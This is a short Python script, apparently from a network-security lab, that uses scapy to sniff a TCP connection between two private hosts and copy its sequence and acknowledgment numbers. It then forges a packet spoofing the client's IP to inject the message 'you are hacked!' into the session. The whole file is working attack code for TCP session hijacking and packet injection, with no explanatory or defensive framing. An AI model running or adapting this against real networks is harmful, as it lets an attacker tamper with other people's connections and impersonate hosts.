from scapy.all import *
import time

# Function to capture the latest sequence and acknowledgment numbers
def get_latest_seq_ack():
    seq_num, ack_num = None, None
    # Sniff a single packet
    packets = sniff(count=1, filter="tcp and host 10.0.0.1 and host 10.0.0.2")
    for packet in packets:
        if packet.haslayer(TCP):
            tcp_layer = packet[TCP]
            seq_num = tcp_layer.seq
            ack_num = tcp_layer.ack
            print(f"Captured Seq={seq_num}, Ack={ack_num}")
            return seq_num, ack_num
    return None, None

# Capture the latest SEQ and ACK before sending the spoofed packet
seq_num, ack_num = get_latest_seq_ack()

if seq_num is not None and ack_num is not None:
    print(f"Using Seq={seq_num} and Ack={ack_num}")

    # IP and TCP details (Spoofed Packet)
    ip = IP(src="10.0.0.2", dst="10.0.0.1")  # Spoofing Host 2 (Client IP)
    
    # Send the message "you are hacked!"
    data = "you are hacked!"  # 15 bytes
    
    # Adjust sequence number based on the length of the data
    seq_num += len(data)  # Increment SEQ by 15 bytes to account for the message length
    
    tcp = TCP(sport=54262, dport=5555, seq=seq_num, ack=ack_num, flags="PA")  # Use 'PA' flags to send data
    forged_packet = ip/tcp/data
    
    # Send the forged packet
    send(forged_packet)
    print("Spoofed packet with 'you are hacked!' sent successfully!")
else:
    print("Failed to retrieve seq and ack numbers.")
